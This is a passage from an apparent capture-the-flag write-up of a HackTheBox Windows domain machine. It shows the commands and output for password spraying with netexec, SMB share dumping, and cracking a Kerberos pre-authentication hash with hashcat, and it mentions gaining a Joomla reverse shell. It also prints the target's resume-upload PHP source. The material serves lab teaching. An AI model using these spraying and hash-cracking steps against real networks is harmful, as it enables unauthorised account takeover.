</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2024</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">04</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">28</span> <span style="color:#bd93f9">13</span>:<span style="color:#bd93f9">13</span>:<span style="color:#bd93f9">59</span> <span style="color:#ff79c6">&gt;</span>  [<span style="color:#ff79c6">+</span>] VALID USERNAME:	 dlanor@office<span style="color:#ff79c6">.</span>htb
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2024</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">04</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">28</span> <span style="color:#bd93f9">13</span>:<span style="color:#bd93f9">13</span>:<span style="color:#bd93f9">59</span> <span style="color:#ff79c6">&gt;</span>  [<span style="color:#ff79c6">+</span>] VALID USERNAME:	 dmichael@office<span style="color:#ff79c6">.</span>htb
</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2024</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">04</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">28</span> <span style="color:#bd93f9">13</span>:<span style="color:#bd93f9">54</span>:<span style="color:#bd93f9">19</span> <span style="color:#ff79c6">&gt;</span>  [<span style="color:#ff79c6">+</span>] VALID USERNAME:	 hhogan@office<span style="color:#ff79c6">.</span>htb
</span></span></code></pre></div><p>Now let&rsquo;s try <code>netexec</code> to spray the password using these usernames.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ nxc ldap dc.office.htb -u ad_users.txt -p &#39;H0lOgrams4reTakIng0Ver754!&#39;      
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>LDAP        10.10.11.3      389    dc.office.htb    [-] Error retrieving os arch of 10.10.11.3: Could not connect: timed out
</span></span><span style="display:flex;"><span>SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
</span></span><span style="display:flex;"><span>LDAP        10.10.11.3      389    DC               [-] office.htb\administrator:H0lOgrams4reTakIng0Ver754!
</span></span><span style="display:flex;"><span>LDAP        10.10.11.3      389    DC               [-] office.htb\Administrator:H0lOgrams4reTakIng0Ver754!
</span></span><span style="display:flex;"><span>LDAP        10.10.11.3      389    DC               [-] office.htb\ewhite:H0lOgrams4reTakIng0Ver754!
</span></span><span style="display:flex;"><span>LDAP        10.10.11.3      389    DC               [-] office.htb\etower:H0lOgrams4reTakIng0Ver754!
</span></span><span style="display:flex;"><span>LDAPS       10.10.11.3      636    DC               [+] office.htb\dwolfe:H0lOgrams4reTakIng0Ver754!
</span></span></code></pre></div><p>Looks like I got a match for the user <code>dwolfe</code>. Let&rsquo;s enumerate his shares.</p>
</li>
<li>
<p><strong>SMB Enumeration</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ nxc smb dc.office.htb -u &#39;dwolfe&#39; -p &#39;H0lOgrams4reTakIng0Ver754!&#39; --shares
</span></span><span style="display:flex;"><span>SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
</span></span><span style="display:flex;"><span>SMB         10.10.11.3      445    DC               [+] office.htb\dwolfe:H0lOgrams4reTakIng0Ver754!
</span></span><span style="display:flex;"><span>SMB         10.10.11.3      445    DC               [*] Enumerated shares
</span></span><span style="display:flex;"><span>SMB         10.10.11.3      445    DC               Share           Permissions     Remark
</span></span><span style="display:flex;"><span>SMB         10.10.11.3      445    DC               -----           -----------     ------
</span></span><span style="display:flex;"><span>SMB         10.10.11.3      445    DC               ADMIN$                          Remote Admin
</span></span><span style="display:flex;"><span>SMB         10.10.11.3      445    DC               C$                              Default share
</span></span><span style="display:flex;"><span>SMB         10.10.11.3      445    DC               IPC$            READ            Remote IPC
</span></span><span style="display:flex;"><span>SMB         10.10.11.3      445    DC               NETLOGON        READ            Logon server share
</span></span><span style="display:flex;"><span>SMB         10.10.11.3      445    DC               SOC Analysis    READ            
</span></span><span style="display:flex;"><span>SMB         10.10.11.3      445    DC               SYSVOL          READ            Logon server share
</span></span></code></pre></div><p>I found an unusual share named <code>SOC Analysis</code> let&rsquo;s dump it using <code>smbclient</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ smbclient &#39;\\10.10.11.3\SOC Analysis&#39; -U dwolfe -L
</span></span><span style="display:flex;"><span>Password for [WORKGROUP\dwolfe]:
</span></span><span style="display:flex;"><span>Try &#34;help&#34; to get a list of possible commands.
</span></span><span style="display:flex;"><span>smb: \&gt; dir
</span></span><span style="display:flex;"><span>  .                                   D        0  Wed May 10 13:52:24 2023
</span></span><span style="display:flex;"><span>  ..                                DHS        0  Wed Feb 14 04:18:31 2024
</span></span><span style="display:flex;"><span>  Latest-System-Dump-8fbc124d.pcap      A  1372860  Sun May  7 19:59:00 2023
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		6265599 blocks of size 4096. 1193500 blocks available
</span></span><span style="display:flex;"><span>smb: \&gt; get Latest-System-Dump-8fbc124d.pcap
</span></span><span style="display:flex;"><span>getting file \Latest-System-Dump-8fbc124d.pcap of size 1372860 as Latest-System-Dump-8fbc124d.pcap (387.6 KiloBytes/sec) (average 387.6 KiloBytes/sec)
</span></span><span style="display:flex;"><span>smb: \&gt; exit
</span></span></code></pre></div><p>Let&rsquo;s analyze the pcap file using wireshark.</p>
</li>
<li>
<p><strong>PCap Analysis</strong></p>
<p><img src="images/wireshark.png" alt="pcap analysis"></p>
<p><img src="images/kerberos.png" alt="alt text"></p>
</li>
<li>
<p><strong>ASREQRoast - Cracking Pre-Auth Timestamp</strong></p>
<p>After analyzing the pcap file I found two <code>AS-REQ</code>. In a typical kerberos setup the the pre-auth feature is enabled by default. If it is enabled we cannot perform <code>ASREPRoast</code> attack. But it opens another vector for an attack. In kerberos when pre-auth is enabled the client encrypts the current timestamp with it&rsquo;s own password as an encryption key. So, if the password is weak enough we can obtain it using <code>hashcat</code> by trying to decrypt the <code>cipher</code> which is shown in the figure. Here the etype is <code>18</code>. So the mode for hashcat would be <code>19900</code>. Which depicts Pre-Auth in hashcat&rsquo;s documentation.</p>
<p>Also I discovered the <code>cname</code> object contained <code>cname-string: tstark</code> this is the user sending the request. So the user is <code>tstark@office.htb</code>. Now let&rsquo;s construct the hash for hashcat.</p>
</li>
<li>
<p><strong>Hashcat</strong></p>
<p>Hash</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$krb5pa$18$tstark$office.htb$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc
</span></span></code></pre></div><p>Cracked</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$krb5pa$18$tstark$office.htb$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc:playboy69
</span></span></code></pre></div></li>
</ul>
<h2 id="foothold">Foothold</h2>
<p>I tried the cracked password against the AD but didn&rsquo;t work. But it worked against Joomla Admin Dashboard. Let&rsquo;s try to get a reverse shell on Joomla Dashboard using templates. I got a shell of the <code>web_account</code> user.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>C:\xampp\htdocs\joomla\templates\cassiopeia&gt;whoami
</span></span><span style="display:flex;"><span>office\web_account
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>C:\xampp\htdocs\joomla\templates\cassiopeia&gt;
</span></span></code></pre></div><p>The <code>htdocs</code> folder contained anothe directory named <code>internal</code> besides <code>joomla</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>C:\xampp\htdocs&gt;dir
</span></span><span style="display:flex;"><span> Volume in drive C has no label.
</span></span><span style="display:flex;"><span> Volume Serial Number is C626-9388
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> Directory of C:\xampp\htdocs
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>05/09/2023  07:53 AM    &lt;DIR&gt;          .
</span></span><span style="display:flex;"><span>01/24/2024  05:08 AM    &lt;DIR&gt;          ..
</span></span><span style="display:flex;"><span>05/09/2023  07:53 AM    &lt;DIR&gt;          administrator
</span></span><span style="display:flex;"><span>01/30/2024  09:39 AM    &lt;DIR&gt;          internal
</span></span><span style="display:flex;"><span>04/30/2024  07:15 AM    &lt;DIR&gt;          joomla
</span></span><span style="display:flex;"><span>               0 File(s)              0 bytes
</span></span><span style="display:flex;"><span>               5 Dir(s)   5,044,477,952 bytes free
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>C:\xampp\htdocs&gt;
</span></span></code></pre></div><p>One file seemed interesting inside the internal directory. It was <code>resume.php</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>C:\xampp\htdocs\internal&gt;dir
</span></span><span style="display:flex;"><span> Volume in drive C has no label.
</span></span><span style="display:flex;"><span> Volume Serial Number is C626-9388
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> Directory of C:\xampp\htdocs\internal
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>01/30/2024  09:39 AM    &lt;DIR&gt;          .
</span></span><span style="display:flex;"><span>05/09/2023  07:53 AM    &lt;DIR&gt;          ..
</span></span><span style="display:flex;"><span>02/14/2024  06:35 PM    &lt;DIR&gt;          applications
</span></span><span style="display:flex;"><span>05/01/2023  04:27 PM    &lt;DIR&gt;          css
</span></span><span style="display:flex;"><span>05/01/2023  04:27 PM    &lt;DIR&gt;          img
</span></span><span style="display:flex;"><span>01/30/2024  09:38 AM             5,113 index.html
</span></span><span style="display:flex;"><span>01/30/2024  09:40 AM             5,282 resume.php
</span></span><span style="display:flex;"><span>               2 File(s)         10,395 bytes
</span></span><span style="display:flex;"><span>               5 Dir(s)   5,038,227,456 bytes free
</span></span></code></pre></div><p><strong>resume.php</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span><span style="color:#ff79c6">&lt;</span>?php
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">$</span>notifi <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span>(<span style="color:#ff79c6">$</span>_SERVER[<span style="color:#f1fa8c">&#34;REQUEST_METHOD&#34;</span>] <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;POST&#34;</span> ){
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">$</span>stdname<span style="color:#ff79c6">=</span>trim(<span style="color:#ff79c6">$</span>_POST[<span style="color:#f1fa8c">&#39;fullname&#39;</span>]);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">$</span>email<span style="color:#ff79c6">=</span>str_replace(<span style="color:#f1fa8c">&#39;.&#39;</span>,<span style="color:#f1fa8c">&#39;-&#39;</span>,<span style="color:#ff79c6">$</span>_POST[<span style="color:#f1fa8c">&#39;email&#39;</span>]);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">$</span>experience<span style="color:#ff79c6">=</span>trim(<span style="color:#ff79c6">$</span>_POST[<span style="color:#f1fa8c">&#39;experience&#39;</span>]);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">$</span>salary<span style="color:#ff79c6">=</span>trim(<span style="color:#ff79c6">$</span>_POST[<span style="color:#f1fa8c">&#39;salary&#39;</span>]);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">$</span>department<span style="color:#ff79c6">=</span>trim(<span style="color:#ff79c6">$</span>_POST[<span style="color:#f1fa8c">&#39;department&#39;</span>]);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">$</span>rewritefn <span style="color:#ff79c6">=</span> strtolower(str_replace(<span style="color:#f1fa8c">&#39; &#39;</span>,<span style="color:#f1fa8c">&#39;-&#39;</span>,<span style="color:#f1fa8c">&#34;$stdname-$department-$salary $experience $email&#34;</span>));
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">$</span>filename <span style="color:#ff79c6">=$</span>_FILES[<span style="color:#f1fa8c">&#39;assignment&#39;</span>][<span style="color:#f1fa8c">&#39;name&#39;</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">$</span>filetype<span style="color:#ff79c6">=</span> <span style="color:#ff79c6">$</span>_FILES[<span style="color:#f1fa8c">&#39;assignment&#39;</span>][<span style="color:#f1fa8c">&#39;type&#39;</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">$</span>filesize <span style="color:#ff79c6">=$</span>_FILES[<span style="color:#f1fa8c">&#39;assignment&#39;</span>][<span style="color:#f1fa8c">&#39;size&#39;</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">$</span>fileerr <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">$</span>_FILES[<span style="color:#f1fa8c">&#39;assignment&#39;</span>][<span style="color:#f1fa8c">&#39;error&#39;</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">$</span>filetmp <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">$</span>_FILES[<span style="color:#f1fa8c">&#39;assignment&#39;</span>][<span style="color:#f1fa8c">&#39;tmp_name&#39;</span>];
</span></span><span style="display:flex;"><span>  chmod(<span style="color:#ff79c6">$</span>_FILES[<span style="color:#f1fa8c">&#39;assignment&#39;</span>][<span style="color:#f1fa8c">&#39;tmp_name&#39;</span>], <span style="color:#bd93f9">0664</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">//</span> onigiri <span style="color:#ff79c6">in</span> <span style="color:#ff79c6">.</span>
</span></span><span style="display:flex;"><span> <span style="color:#ff79c6">$</span>ext <span style="color:#ff79c6">=</span> explode(<span style="color:#f1fa8c">&#39;.&#39;</span>,<span style="color:#ff79c6">$</span>filename);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">//</span>last piece of data from array
</span></span><span style="display:flex;"><span> <span style="color:#ff79c6">$</span>extension <span style="color:#ff79c6">=</span> strtolower(end(<span style="color:#ff79c6">$</span>ext));
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">$</span>filesallowed <span style="color:#ff79c6">=</span> array(<span style="color:#f1fa8c">&#39;docm&#39;</span>,<span style="color:#f1fa8c">&#39;docx&#39;</span>,<span style="color:#f1fa8c">&#39;doc&#39;</span>,<span style="color:#f1fa8c">&#39;odt&#39;</span>);
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">if</span>(in_array(<span style="color:#ff79c6">$</span>extension,<span style="color:#ff79c6">$</span>filesallowed)){
</span></span><span style="display:flex;"><span>     <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">$</span>fileerr <span style="color:#ff79c6">===</span> <span style="color:#bd93f9">0</span>){
</span></span><span style="display:flex;"><span>       <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">$</span>filesize <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">5242880</span>){
</span></span><span style="display:flex;"><span>	 <span style="color:#ff79c6">$</span>ff <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;$rewritefn.$extension&#34;</span>;
</span></span><span style="display:flex;"><span>	 <span style="color:#ff79c6">$</span>loc <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;applications/&#34;</span><span style="color:#ff79c6">.$</span>ff;
</span></span><span style="display:flex;"><span>	   <span style="color:#ff79c6">if</span>(move_uploaded_file(<span style="color:#ff79c6">$</span>filetmp,<span style="color:#ff79c6">$</span>loc))
</span></span><span style="display:flex;"><span>	   {
</span></span><span style="display:flex;"><span>	     <span style="color:#ff79c6">//</span> upload successful
</span></span><span style="display:flex;"><span>	     <span style="color:#ff79c6">$</span>notifi<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;&lt;span class=notifi&gt;â Upload Successful!&lt;/span&gt;&lt;hr/&gt;&lt;style&gt;</span>
</span></span><span style="display:flex;"><span>	       button, input , select, option, h3{
</span></span><span style="display:flex;"><span>			display:none;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	       <span style="color:#ff79c6">&lt;/</span>style<span style="color:#ff79c6">&gt;</span><span style="color:#f1fa8c">&#34;;</span>
</span></span><span style="display:flex;"><span>	 } <span style="color:#ff79c6">else</span> {
</span></span><span style="display:flex;"><span>echo <span style="color:#ff79c6">$</span>loc;
</span></span><span style="display:flex;"><span>	 <span style="color:#ff79c6">$</span>notifi<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;&lt;span class=notifi&gt;âï¸  Something Went Wrong! Unable To upload the Resume!&lt;/span&gt;&lt;hr/&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>	 }
</span></span><span style="display:flex;"><span>       
</span></span><span style="display:flex;"><span>       } <span style="color:#ff79c6">else</span> {
</span></span><span style="display:flex;"><span>	 
</span></span><span style="display:flex;"><span>	 <span style="color:#ff79c6">$</span>notifi<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;&lt;span class=notifi&gt;â ï¸  Your Resume should be less than 5MB!&lt;/span&gt;&lt;hr/&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>       }
</span></span><span style="display:flex;"><span>     
</span></span><span style="display:flex;"><span>     } <span style="color:#ff79c6">else</span> {
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">$</span>notifi<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;&lt;span class=notifi&gt;âï¸  Corrupted File/Unable to Upload!&lt;/span&gt;&lt;hr/&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>     }
</span></span><span style="display:flex;"><span>   
</span></span><span style="display:flex;"><span>   } <span style="color:#ff79c6">else</span> {
</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">$</span>notifi<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;&lt;span class=notifi&gt;â Accepted File Types : Doc, Docx, Docm, Odt!&lt;/span&gt;&lt;hr/&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>?<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;!</span>DOCTYPE html<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;</span>html lang<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;en&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;</span>head<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&lt;</span>meta charset<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;UTF-8&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">&lt;</span>link rel<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;shortcut icon&#34;</span> href<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;https://www.pinclipart.com/picdir/big/344-3445944_png-file-svg-terminal-icon-png-clipart.png&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&lt;</span>title<span style="color:#ff79c6">&gt;</span>Resume Submission<span style="color:#ff79c6">&lt;/</span>title<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&lt;</span>meta name<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;viewport&#34;</span> content<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;width=device-width, initial-scale=1.0&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;</span>style type<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;text/css&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>body{
</span></span><span style="display:flex;"><span>height:<span style="color:#bd93f9">100</span><span style="color:#ff79c6">%</span>;
</span></span><span style="display:flex;"><span>overflow:auto;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">.</span>notifi{
</span></span><span style="display:flex;"><span>font<span style="color:#ff79c6">-</span>weight:bold;
</span></span><span style="display:flex;"><span>padding:<span style="color:#bd93f9">0</span>px;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">.</span>notifi hr{
</span></span><span style="display:flex;"><span>background:<span style="color:#6272a4">#000000;</span>
</span></span><span style="display:flex;"><span>height:<span style="color:#bd93f9">2</span>px;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">.</span>magic{
</span></span><span style="display:flex;"><span>margin<span style="color:#ff79c6">-</span>top:<span style="color:#bd93f9">0.5</span><span style="color:#ff79c6">%</span>;
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">max</span><span style="color:#ff79c6">-</span>height:<span style="color:#bd93f9">90</span><span style="color:#ff79c6">%</span>;
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">max</span><span style="color:#ff79c6">-</span>width:<span style="color:#bd93f9">90</span><span style="color:#ff79c6">%</span>;
</span></span><span style="display:flex;"><span>border: <span style="color:#bd93f9">2</span>px solid <span style="color:#6272a4">#000000;</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">.</span>inpstylef{
</span></span><span style="display:flex;"><span>border<span style="color:#ff79c6">-</span>bottom: <span style="color:#bd93f9">2</span>px solid <span style="color:#6272a4">#000000;</span>
</span></span><span style="display:flex;"><span>padding:<span style="color:#bd93f9">0.5</span><span style="color:#ff79c6">%</span>;
</span></span><span style="display:flex;"><span>font<span style="color:#ff79c6">-</span>size:<span style="color:#bd93f9">14</span>px;
</span></span><span style="display:flex;"><span>font<span style="color:#ff79c6">-</span>weight:bold;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">.</span>inputstyle ,<span style="color:#ff79c6">.</span>inpstyles {
</span></span><span style="display:flex;"><span>width:<span style="color:#bd93f9">69</span><span style="color:#ff79c6">%</span>;
</span></span><span style="display:flex;"><span>height:<span style="color:#bd93f9">35</span>px;
</span></span><span style="display:flex;"><span>border:<span style="color:#bd93f9">2</span>px solid <span style="color:#6272a4">#000000;</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">.</span>inpstylef::<span style="color:#ff79c6">-</span>webkit<span style="color:#ff79c6">-</span>file<span style="color:#ff79c6">-</span>upload<span style="color:#ff79c6">-</span>button {
</span></span><span style="display:flex;"><span>  visibility: hidden;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">.</span>inpstylef::before {
</span></span><span style="display:flex;"><span>  content: <span style="color:#f1fa8c">&#39;  ï®&#39;</span>;
</span></span><span style="display:flex;"><span>  display: inline<span style="color:#ff79c6">-</span>block;
</span></span><span style="display:flex;"><span>  border: <span style="color:#bd93f9">1</span>px solid <span style="color:#6272a4">#999;</span>
</span></span><span style="display:flex;"><span>  border<span style="color:#ff79c6">-</span>radius: <span style="color:#bd93f9">3</span>px;
</span></span><span style="display:flex;"><span>  padding: <span style="color:#bd93f9">5</span>px <span style="color:#bd93f9">8</span>px;
</span></span><span style="display:flex;"><span>  outline: none;
</span></span><span style="display:flex;"><span>  white<span style="color:#ff79c6">-</span>space: nowrap;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">-</span>webkit<span style="color:#ff79c6">-</span>user<span style="color:#ff79c6">-</span>select: none;
</span></span><span style="display:flex;"><span>  cursor: pointer;
</span></span><span style="display:flex;"><span>  text<span style="color:#ff79c6">-</span>shadow: <span style="color:#bd93f9">1</span>px <span style="color:#bd93f9">1</span>px <span style="color:#6272a4">#fff;</span>
</span></span><span style="display:flex;"><span>  font<span style="color:#ff79c6">-</span>weight: <span style="color:#bd93f9">700</span>;
</span></span><span style="display:flex;"><span>  font<span style="color:#ff79c6">-</span>size: <span style="color:#bd93f9">10</span>pt;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>::placeholder{
</span></span><span style="display:flex;"><span>color:<span style="color:#6272a4">#151715;</span>
</span></span><span style="display:flex;"><span>opacity:<span style="color:#bd93f9">1</span>;
</span></span><span style="display:flex;"><span>font<span style="color:#ff79c6">-</span>weight:bold;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">.</span>magic h3{
</span></span><span style="display:flex;"><span>    text<span style="color:#ff79c6">-</span>align: left;
</span></span><span style="display:flex;"><span>    padding<span style="color:#ff79c6">-</span>left: <span style="color:#bd93f9">260</span>px;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;/</span>style<span style="color:#ff79c6">&gt;</span>  
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;/</span>head<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;</span>body<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&lt;</span>center<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;</span>div <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;magic&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;</span>h1<span style="color:#ff79c6">&gt;</span>ï Job Application Submission<span style="color:#ff79c6">&lt;/</span>h1<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">&lt;</span>hr style<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;width:inherit;padding:0px;height:2px; background:#000000&#34;</span><span style="color:#ff79c6">/&gt;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">&lt;</span>span <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;notifi&#34;</span><span style="color:#ff79c6">&gt;&lt;</span>?php echo <span style="color:#f1fa8c">&#34;$notifi&#34;</span>; ?<span style="color:#ff79c6">&gt;&lt;/</span>span<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;</span>form action<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;&#34;</span> method<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;post&#34;</span> enctype<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;multipart/form-data&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>h3<span style="color:#ff79c6">&gt;</span>Full Name:<span style="color:#ff79c6">&lt;/</span>h3<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>input <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inputstyle&#34;</span> type<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;text&#34;</span> name<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;fullname&#34;</span> placeholder<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Example : John Doe&#34;</span> required<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>h3<span style="color:#ff79c6">&gt;</span>Email:<span style="color:#ff79c6">&lt;/</span>h3<span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">&lt;</span>input <span style="color:#ff79c6">class</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;inputstyle&#34;</span> type<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;email&#34;</span> name<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;email&#34;</span> placeholder<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34; Example : xxx123@xyz.abc&#34;</span> required<span style="color:#ff79c6">&gt;</span>
